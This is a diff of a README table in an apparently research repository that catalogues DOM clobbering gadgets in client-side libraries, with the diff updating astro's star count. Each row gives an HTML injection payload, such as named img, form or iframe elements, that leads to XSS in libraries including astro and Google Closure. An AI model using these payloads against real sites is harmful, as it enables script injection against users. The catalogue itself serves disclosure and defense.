@@ -7,7 +7,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 | Library | Stars | Version | Payloads | Impact | Found By | Status | CVE |
 |:-------:|:-----:|:-------:|----------|:------:|:--------:|:------:|:---:|
 | [AddToAny](./domc-gadgets/addtoany.md) | N/A | N/A | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | N/A |
-| [astro](./domc-gadgets/astro.md) | N/A | v4.5.9 | ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>``` | XSS | TheHulk | N/A | N/A |
+| [astro](./domc-gadgets/astro.md) | 45.7K | v4.5.9 | ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>``` | XSS | TheHulk | N/A | N/A |
 | [doomcaptcha](./domc-gadgets/doomcaptcha.md) | 1K | latest | ```<img name="currentScript" label="<script>alert(1)</script>"></img>``` | XSS | TheHulk | Mitre | N/A |
 | [Google Client API](./domc-gadgets/google-client-api.md) | N/A | 5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>``` | XSS | TheHulk | Patched | N/A |
 | [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
